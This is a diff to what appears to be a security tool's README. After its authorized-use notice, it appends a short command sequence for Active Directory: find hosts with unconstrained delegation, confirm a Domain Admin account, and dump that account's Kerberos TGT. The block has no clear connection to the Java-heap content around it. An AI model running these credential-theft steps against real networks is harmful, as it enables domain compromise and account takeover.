@@ -126,3 +126,19 @@ Java `String` objects are stored as **UTF-16 LE** in the heap — search for the
 ## Legal
 
 For use on devices and applications you own or have explicit written authorization to test.
+
+
+``` shell
+# Use LDAP to find computers configured for unconstrained delegation.
+ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
+
+# Triage tickets
+krb_triage
+
+# Confirm that dyork is a Domain Admin.
+ldapsearch samAccountName=dyork --attributes memberOf
+
+# Dump the TGT.
+krb_dump /user:dyork /service:krbtgt
+```
+
